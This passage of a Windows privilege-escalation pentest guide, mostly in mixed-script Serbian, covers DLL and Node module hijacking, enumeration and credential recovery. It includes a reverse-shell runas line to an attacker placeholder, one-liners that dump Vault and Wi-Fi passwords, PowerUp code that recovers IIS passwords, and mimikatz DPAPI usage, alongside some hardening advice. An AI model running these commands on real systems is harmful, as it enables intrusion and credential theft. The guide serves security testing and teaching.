## PATH DLL Hijacking

Ako imate **dozvole za upisivanje u fasciklu koja se nalazi u PATH-u**, možda ćete moći da otmete DLL koji učitava proces i **eskalirate privilegije**.<sup>[[2]](#references)</sup>

Proverite dozvole za sve fascikle unutar PATH-a:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

За више информација о томе како да се злоупотреби ова провера:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Отмица резолуције модула Node.js / Electron преко `C:\node_modules`

Ово је варијанта **неконтролисане путање претраге у Windows-у** која утиче на апликације **Node.js** и **Electron** када извршавају голи import као што је `require("foo")`, а очекивани модул **недостаје**.<sup>[[20]](#references)</sup>

Node разрешава пакете тако што се креће уз стабло директоријума и проверава фасцикле `node_modules` у сваком родитељском директоријуму. У Windows-у та претрага може да стигне до корена диска, па апликација покренута из `C:\Users\Administrator\project\app.js` може да проверава следеће локације:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Ако **корисник са ниским привилегијама** може да направи `C:\node_modules`, може да постави злонамерни `foo.js` (или фасциклу пакета) и сачека да **Node/Electron процес са вишим привилегијама** разреши недостајућу зависност. Payload се извршава у безбедносном контексту процеса жртве, па ово постаје **LPE** кад год се циљ покреће као администратор, из повишеног заказаног задатка/обмотавајуће услуге или као привилегована десктоп апликација која се аутоматски покреће.

Ово је нарочито често када:

- је зависност наведена у `optionalDependencies`<sup>[[22]](#references)</sup>
- библиотека треће стране обавија `require("foo")` у `try/catch` и наставља са радом у случају грешке
- је пакет уклоњен из продукционих верзија, изостављен током паковања или није успео да се инсталира
- се рањиви `require()` налази дубоко у стаблу зависности, уместо у главном коду апликације

### Проналажење рањивих циљева

Користите **Procmon** да потврдите путању резолуције:<sup>[[23]](#references)</sup>

- Филтрирајте по `Process Name` = извршна датотека циља (`node.exe`, EXE датотека Electron апликације или процес омотача)
- Филтрирајте по `Path` `contains` `node_modules`
- Усредсредите се на `NAME NOT FOUND` и коначно успешно отварање унутар `C:\node_modules`

Корисни обрасци за преглед кода у распакованим `.asar` датотекама или изворном коду апликације:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Eksploatacija

1. Utvrdite **naziv paketa koji nedostaje** pomoću Procmon-a ili pregledom izvornog koda.
2. Kreirajte osnovni direktorijum za pretragu ako već ne postoji:

```powershell
mkdir C:\node_modules
```

3. Postavite modul sa tačno očekivanim nazivom:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Pokrenite aplikaciju žrtve. Ako aplikacija pokuša `require("foo")`, a legitimni modul nedostaje, Node može učitati `C:\node_modules\foo.js`.

Primeri nedostajućih opcionalnih modula iz stvarnog sveta koji odgovaraju ovom obrascu uključuju `bluebird` i `utf-8-validate`, ali **tehnika** je ono što se može ponovo koristiti: pronađite bilo koji **nedostajući goli import** koji će privilegovani Windows Node/Electron proces razrešiti.

### Ideje za otkrivanje i ojačavanje bezbednosti

- Generišite upozorenje kada korisnik napravi `C:\node_modules` ili tamo upiše nove `.js` datoteke/pakete.
- Potražite procese visokog integriteta koji čitaju iz `C:\node_modules\*`.
- U produkciji uključite sve zavisnosti izvršnog okruženja u pakete i proverite upotrebu `optionalDependencies`.
- Pregledajte kôd trećih strana i potražite obrasce `try { require("...") } catch {}` koji ne prijavljuju greške.
- Onemogućite opcionalne provere ako ih biblioteka podržava (na primer, neke `ws` implementacije mogu izbeći zastarelu proveru `utf-8-validate` pomoću `WS_NO_UTF_8_VALIDATE=1`).

## Mreža

### Deljeni resursi

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### datoteka hosts

Proverite da li su u datoteci hosts hardkodirani drugi poznati računari.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Mrežni interfejsi i DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Otvoreni portovi

Proverite da li su **ograničene usluge** dostupne spolja.

```bash
netstat -ano #Opened ports?
```

Za lokalni listener, povežite njegov PID sa vlasnikom procesa, putanjom izvršne datoteke i servisom ili zakazanim zadatkom koji ga pokreće. Servis za daljinsko upravljanje može omogućiti pristup kao njegov desktop korisnik samo ako to dozvoljavaju njegova autentifikacija i kontrole komandi. Prilagođena TCP aplikacija koja radi pod nalogom sa višim privilegijama zaseban je cilj za proveru: listener i putanja binarne datoteke pasivni su tragovi, dok ruta za iskorišćavanje oštećenja memorije zahteva analizu baš te binarne datoteke i ulaza koji joj je dostupan. Ako izgleda da izloženi port pripada sistemskom procesu, uporedite ga sa [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) pre nego što utvrdite koja je pozadinska usluga u pitanju; samo pravilo za prosleđivanje ne dokazuje da je odredište dostupno ili ranjivo.

### Tabela rutiranja

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP tabela

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Pravila zaštitnog zida

[**Pogledajte ovu stranicu za komande povezane sa zaštitnim zidom**](../basic-cmd-for-pentesters.md#firewall) **(prikazivanje pravila, kreiranje pravila, isključivanje, isključivanje...)**

Više[ komandi za enumeraciju mreže ovde](../basic-cmd-for-pentesters.md#network)

### Windows podsistem za Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Binarni fajl `bash.exe` može se pronaći i u `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ako dobijete root korisnika, možete osluškivati na bilo kom portu (kada prvi put upotrebite `nc.exe` za osluškivanje na portu, pojaviće se GUI prozor sa pitanjem da li `nc` treba da bude dozvoljen kroz firewall).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Da biste lako pokrenuli bash kao root, možete da probate `--default-user root`

Možete da istražite `WSL` sistem datoteka u fascikli `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Linux `root` unutar WSL-a sam po sebi ne daje administratorska prava u Windowsu. Ako trenutni Windows identitet može da čita sistem datoteka distribucije, pregledajte datoteke istorije shell-a (uključujući `/root/.bash_history`) i potražite komande koje su možda zabeležile akreditive; za eskalaciju je i dalje potreban važeći nalog sa višim privilegijama i dozvoljen način autentifikacije. Raspored `LocalState\rootfs` važi za starije WSL instalacije; WSL 2 obično skladišti distribuciju na virtuelnom disku [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), zato prvo utvrdite stvarnu distribuciju i putanju skladišta. Izbegavajte ispisivanje sadržaja istorije tokom automatizovanog popisivanja.

## Windows akreditivi

### Winlogon akreditivi

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Treat `DefaultUserName` and `DefaultDomainName` as account context, not credentials. A nonempty `DefaultPassword` or `AltDefaultPassword` value is a registry finding containing a plaintext password. If `AutoAdminLogon=1` but no plaintext password is readable, that is only an indication: [Sysinternals Autologon can store the password as an LSA secret](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), and ordinary registry reads do not establish whether that secret exists or can be retrieved. Review access rights and the actual logon configuration before reporting a credential exposure.

### Credential Manager / Windows Vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault čuva korisničke akreditive za servere, veb-sajtove i druge programe koje **Windows** može da koristi za **automatsko prijavljivanje korisnika**. Na prvi pogled može delovati da korisnici mogu da čuvaju akreditive za sajtove kao što su Facebook, Twitter ili Gmail i da se pregledači automatski prijavljuju, ali to ne funkcioniše tako.

Windows Vault čuva akreditive pomoću kojih Windows može automatski da prijavi korisnike. To znači da svaka **Windows aplikacija kojoj su potrebni akreditivi za pristup resursu** (serveru ili veb-sajtu) **može da koristi ovaj Credential Manager** i Windows Vault, kao i da koristi dostavljene akreditive umesto da korisnici stalno unose korisničko ime i lozinku.

Ako aplikacije ne komuniciraju sa Credential Manager-om, mislim da ne mogu da koriste akreditive za određeni resurs. Dakle, ako vaša aplikacija želi da koristi vault, trebalo bi nekako da **komunicira sa Credential Manager-om i zatraži akreditive za taj resurs** iz podrazumevanog skladišnog vault-a.

Koristite `cmdkey` da biste izlistali sačuvane akreditive na računaru.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Zatim možete koristiti `runas` sa opcijom `/savecred` da biste upotrebili sačuvane akreditive. Sledeći primer pokreće udaljeni binarni fajl preko SMB deljenog resursa.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Korišćenje `runas` sa dostavljenim akreditivima.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Imajte na umu da se mogu koristiti mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) ili modul [Empire Powershells](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Moderne Windows UWP aplikacije, Microsoft Edge i moderne sistemske usluge čuvaju tokene za autentifikaciju i lozinke u otvorenom tekstu unutar Universal Windows Platform (UWP) `PasswordVault` (dostupan i kao `Web Credentials` u `vaultcmd`). Ovaj prostor za skladištenje izolovan je po sesijama i može se dešifrovati nativno, bez administratorskih prava ili prava `SeDebugPrivilege`.

Izvršite ovu PowerShell komandu u aktivnoj sesiji korisnika da biste odmah izlistali i dešifrovali sva sačuvana korisnička imena i lozinke u otvorenom tekstu:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** pruža metod za simetrično šifrovanje podataka, koji se pretežno koristi u operativnom sistemu Windows za simetrično šifrovanje privatnih ključeva asimetričnog šifrovanja. Ovo šifrovanje koristi korisničku ili sistemsku tajnu kao značajan doprinos entropiji.

**DPAPI omogućava šifrovanje ključeva pomoću simetričnog ključa izvedenog iz korisnikovih tajni za prijavljivanje**. U slučajevima kada se koristi sistemsko šifrovanje, ono koristi sistemske tajne za autentifikaciju domena.

Korisnički RSA ključevi šifrovani pomoću DPAPI-ja čuvaju se u direktorijumu `%APPDATA%\Microsoft\Protect\{SID}`, gde `{SID}` predstavlja korisnikov [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier). **DPAPI ključ, koji se nalazi u istoj datoteci kao i master key koji štiti korisnikove privatne ključeve**, obično se sastoji od 64 bajta nasumičnih podataka. (Važno je napomenuti da je pristup ovom direktorijumu ograničen, pa se njegov sadržaj ne može izlistati pomoću komande `dir` u CMD-u, ali se može izlistati kroz PowerShell.)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Možete koristiti **mimikatz module** `dpapi::masterkey` sa odgovarajućim argumentima (`/pvk` ili `/rpc`) da biste ga dešifrovali.

**Datoteke sa kredencijalima zaštićene glavnom lozinkom** obično se nalaze u:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Možete koristiti **mimikatz modul** `dpapi::cred` sa odgovarajućim `/masterkey` da biste dešifrovali.\
Možete **izvući mnogo DPAPI** **masterkeys** iz **memorije** pomoću modula `sekurlsa::dpapi` (ako ste root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell akreditivi

**PowerShell akreditivi** se često koriste za **skriptovanje** i zadatke automatizacije kao praktičan način za čuvanje šifrovanih akreditiva. Akreditivi su zaštićeni pomoću **DPAPI**, što obično znači da ih može dešifrovati samo isti korisnik na istom računaru na kojem su napravljeni.

Izvezeni akreditiv može imati proizvoljno ime datoteke ili putanju `.xml`. Kada skripta ili popis datoteka ukaže na njega, pronađite stvarnu direktorijumsku putanju profila naloga, umesto da pretpostavite `C:\Users`: [Windows može da smesti profile na druge lokacije](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Čitljiva datoteka samo je trag; [Windows `Export-Clixml` vezuje šifrovani akreditiv za korisnika i računar koji su ga izvezli](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), a svaki oporavljeni nalog mora zasebno da ima važeća ovlašćenja za željeni servis. Najpre pregledajte putanje i ACL-ove, bez ispisivanja šifrovanih ili tekstualnih vrednosti tokom uobičajenog popisivanja.

Da biste **dešifrovali** PowerShell akreditive iz datoteke koja ih sadrži, možete da uradite sledeće:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wi-Fi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Sačuvane RDP veze

Možete ih pronaći u `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
i u `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Nedavno pokrenute komande

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Menadžer akreditiva za udaljenu radnu površinu**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Koristite Mimikatz modul `dpapi::rdg` sa odgovarajućim `/masterkey` da biste **dešifrovali sve .rdg datoteke**\
Možete **izvući mnoge DPAPI masterkey ključeve** iz memorije pomoću Mimikatz modula `sekurlsa::dpapi`

**mRemoteNG koristi drugačije skladište veza.** Pregledajte čitljive XML datoteke u `%APPDATA%\mRemoteNG` i fasciklama Documents korisnika, uključujući datoteke sa uobičajenim imenima kao što je `config.xml`. Utvrdite šemu veza i šifrovane atribute `Password` pre nego što XML datoteku smatrate mogućim izvorom akreditiva. Sačuvana vrednost nije DPAPI/RDCMan lozinka; oporavak zavisi od postavki šifrovanja datoteke i od toga da li je korišćena prilagođena glavna lozinka. Izbegavajte ispisivanje šifrovanih vrednosti tokom opsežnog pretraživanja.

**Izvezi profila Remote Desktop Plus** mogu biti čitljivi i u korisničkim direktorijumima ili deljenoj administrativnoj fascikli. Nasleđeni izvoz `profiles.xml` sadrži unose `Data/Profile` sa elementima `ProfileName`, `Password` i `Secure`. Neprazan element lozinke smatrajte mogućim izvorom akreditiva, ali ga nemojte ispisivati niti pretpostavljati da je u čistom tekstu: [dobavljač navodi](https://www.donkz.nl/) da zaštita profila može biti vezana za nalog i računar na kojima je profil kreiran ili konfigurisana uz slabiju zaštitu. Proverite poreklo datoteke i uslove oporavka pre nego što se oslonite na nju.

### Sticky Notes

Ljudi često koriste aplikaciju Sticky Notes na Windows radnim stanicama da bi **sačuvali lozinke** i druge informacije, ne shvatajući da je u pitanju datoteka baze podataka. Ova datoteka se nalazi na putanji `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` i uvek vredi potražiti je i pregledati.

Ljudi ponekad čuvaju lozinke i druge informacije u aplikacijama za lepljive beleške. Microsoftova upakovana aplikacija Sticky Notes obično čuva beleške na putanji `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; starije ili drugačije aplikacije mogu koristiti druga skladišta u korisničkom profilu, uključujući LevelDB. Utvrdite koja je aplikacija instalirana i koji format skladišta koristi pre nego što odsustvo SQLite datoteke protumačite kao odsustvo beleški.

Ako Sticky Notes koristi SQLite zapisivanje unapred (WAL), kopija datoteke `plum.sqlite` sama po sebi može izostaviti nedavno potvrđene beleške. Sačuvajte odgovarajuću datoteku `plum.sqlite-wal` zajedno sa doslednom kopijom baze podataka i uključite `plum.sqlite-shm` ako je dostupna; indeks zajedničke memorije može ponovo da se izgradi, ali WAL je deo trajnog stanja baze podataka. Pogledajte [SQLite dokumentaciju za WAL](https://www.sqlite.org/wal.html). Beleška koja sadrži ime naloga ili lozinku samo je mogući izvor akreditiva: zasebno proverite nalog, dozvoljeni pristup i ponovnu upotrebu lozinke. Šifrovan zapis iz menadžera lozinki dodatno zahteva stvarni ključ za dešifrovanje i tumačenje specifično za aplikaciju da bi mogao da potvrdi prijavu sa višim privilegijama.

### AppCmd.exe

**Imajte na umu da za oporavak lozinki iz AppCmd.exe morate biti Administrator i pokrenuti ga na nivou High Integrity.**\
**AppCmd.exe** se nalazi u direktorijumu `%systemroot%\system32\inetsrv\`.\
Ako ova datoteka postoji, moguće je da su konfigurisani neki **akreditivi** koje je moguće **oporaviti**.

Ovaj kod je preuzet iz [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Proverite da li `C:\Windows\CCM\SCClient.exe` postoji.\
Instalacioni programi se **pokreću sa SYSTEM privilegijama**, a mnogi su ranjivi na **DLL Sideloading (informacije sa** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Datoteke i registrator (akreditivi)

### Artefakti akreditiva alata za podršku u registratoru

Neke starije instalacije alata za daljinsku podršku zadržavaju nazive vrednosti povezane sa lozinkama u fiksnim ključevima aplikacije u registratoru. Na primer, `SecurityPasswordAES` u TeamViewer-u označavao je konfigurisanu statičku lozinku sesije u verzijama pre 9, prema [objašnjenju proizvođača o ključu registratora](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988). Oznaka u nazivu vrednosti samo je trag za proveru: pre procene tog akreditiva proverite instaliranu verziju, čitljivost podataka vrednosti, format i trenutno ponašanje pri autentifikaciji. Prelazak sa lozinke za daljinsku podršku na privilegovaniji Windows nalog zahteva i stvarnu ponovnu upotrebu lozinke i ovlašćenje za taj nalog. Izbegavajte da šifrovani tekst i oporavljene lozinke budu deo rutinskog izlaza enumeracije.

### Deljene tabele sa zaštićenim listovima

Ako se sumnja da čitljiva deljena radna sveska sadrži podatke o nalozima, razlikujte **šifrovanje datoteke** od zaštite radnog lista ili skrivenih kolona. [Microsoft navodi](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) da zaštita radnog lista kontroliše uređivanje i nije bezbednosna funkcija; ona sama po sebi ne dokazuje da je sadržaj radne sveske šifrovan. Pregledajte samo ovlašćene i relevantne datoteke i nemojte ispisivati moguće tajne tokom opšte enumeracije. Čitljiva putanja do `.xlsx` datoteke, zaštićen list ili skrivena kolona sami po sebi ne dokazuju da postoje akreditivi niti da neki nalog ima veće privilegije; zasebno proverite stvarne podatke i trenutna prava naloga.

### Sačuvane zakrpe izmena CI servera

CI server može da zadrži prosleđene izmene izvornog koda u svom direktorijumu sa podacima čak i nakon završetka izgradnje. [TeamCity dokumentuje](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` kao lokaciju za izmene iz daljinskih pokretanja; direktorijum sa podacima može da se konfiguriše i ne mora da bude u okviru `ProgramData`. Čitljiva zakrpa može da sačuva uklonjene ili dodate reference na datoteku akreditiva, ključ za šifrovanje ili skriptu koja koristi oboje. Na primer, PowerShell tok rada `ConvertTo-SecureString -Key` zahteva AES ključ, kao i šifrovani niz; [Microsoft dokumentuje](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) da se ključ prosleđuje zasebno. Najpre pregledajte samo dostupne nazive zakrpa, a zatim, uz ovlašćenje, pregledajte relevantan sadržaj bez ispisivanja tajni u rutinskom izlazu enumeracije. Putanja do zakrpe, šifrovana vrednost ili referenca na ključ sami po sebi ne dokazuju da je akreditiv važeći niti da omogućava pristup sa višim privilegijama. Ograničite ACL-ove direktorijuma sa podacima i izbegavajte unošenje tajni u izmene za izgradnju.

### Prilagođeno menjanje lozinke lokalnog administratora

Ručno napravljena alatka za rotaciju lozinki može da čuva šifrovanu lozinku lokalnog administratora u lokalnoj usluzi, dok akreditive za svoje skladište podataka drži u čitljivoj `.env` datoteci ili pored binarne datoteke programa za ažuriranje. Zajedno pregledajte zakazani zadatak programa za ažuriranje, nalog, ACL-ove konfiguracije, listener i dozvole skladišta podataka. Skladište podataka dostupno samo preko loopback interfejsa i dalje je dostupno lokalnom korisniku koji ima važeće akreditive, ali sama autentifikacija ne dokazuje da korisnik ima dozvolu za čitanje relevantnih zapisa. Ako su seed za šifrovanje ili materijal ključa dostupni pored šifrovanog teksta, proverite tačno izvođenje ključa pre nego što se oslonite na šifrovanje. Šema koja deterministički izvodi AES ključ iz izloženog seed-a pomoću Go paketa [`math/rand`](https://pkg.go.dev/math/rand) nije pogodna za zaštitu te lozinke; Go navodi da taj paket nije primeren za nasumičnost osetljivu na bezbednost. Pre nego što oporavljenu lozinku smatrate mogućim putem za eskalaciju, potvrdite da je važeća i da pripada nalogu iz lokalne grupe Administrators. Zakazani zadatak, putanja do `.env` datoteke ili šifrovani blok sami po sebi ne dokazuju ništa od navedenog. Izbegavajte da lozinke i materijal ključa budu deo rutinskog izlaza enumeracije.

Koristite [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) za upravljane lozinke lokalnih administratora. Njegovo skladištenje u direktorijumu ili Entra okruženju i kontrole pristupa razlikuju se od prilagođenog lokalnog skladišta podataka; [uloge Elasticsearch-a](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) takođe određuju da li autentifikovani korisnik skladišta podataka može da čita određeni indeks.

### Arhive dodataka Java servera i ponovna upotreba akreditiva

Neki dodaci Java servera distribuiraju se kao JAR arhive u direktorijumu servera `plugins`. Čitljiv prilagođeni dodatak može da sadrži konfiguraciju ili bytecode sa ugrađenim akreditivom usluge. Arhivu pregledajte samo uz ovlašćenje i izbegavajte da oporavljene tajne budu deo rutinskog izlaza enumeracije. Sama putanja do dodatka ne dokazuje da tajna postoji, a oporavljena lozinka usluge vodi do viših privilegija samo ako važi i za privilegovaniji nalog. Proverite relevantne ACL-ove datoteka i zamenite ponovo upotrebljene akreditive zasebnim tajnama. Pogledajte [PaperMC vodič za instalaciju dodataka](https://docs.papermc.io/paper/adding-plugins/) za raspored direktorijuma i [Oracle dokumentaciju za JAR](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) za sadržaj arhive.

### Akreditivi ugrađene baze podataka Openfire-a

Instalacija Openfire-a koja koristi ugrađenu bazu podataka može da čuva `openfire.script` u direktorijumu `Openfire\embedded-db`. Ako trenutni nalog može da je čita, zajedno pregledajte zapise `OFUSER` i svojstvo `passwordKey`. [Dokumentacija Openfire-a o pružaocu korisničkih podataka](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) navodi da lozinke mogu da se čuvaju u običnom tekstu ili šifrovane ključem koji se nalazi u tom svojstvu. Oporavljena lozinka važna je za eskalaciju samo ako je i dalje važeća za identitet sa višim privilegijama; sam naziv datoteke ne dokazuje ni pristup za čitanje ni ponovnu upotrebu akreditiva. Putanja služi kao trag za popisivanje, zato izbegavajte da sadržaj baze podataka i akreditivi budu deo rutinskog izlaza enumeracije.

Zasebna datoteka `Openfire\conf\openfire.xml` može da otkrije konfigurisane portove i interfejs za vezivanje administratorske konzole čak i kada se koristi spoljna baza podataka. Openfire obično vezuje administratorsku konzolu za loopback; lokalni nalog i dalje može da pristupi toj adresi ako listener radi. Zajedno proverite aktivni listener, ovlašćenu administratorsku ulogu, pravila za otpremanje dodataka i identitet Openfire usluge. Administrator koji može da instalira dodatak može da pokrene njegov kod u kontekstu usluge, što može podrazumevati visoke privilegije ako se usluga pokreće kao LocalSystem. Lozinka koja se podudara sa lozinkom drugog naloga ili čitljiva putanja konfiguracije sami po sebi ne dokazuju pristup administratorskoj konzoli niti izvršavanje koda. Pogledajte proizvođačev [vodič za instalaciju i upravljanje dodacima](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) i [svojstvo API-ja za otpremanje dodataka](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Konfiguracija servera za forenzičko upravljanje

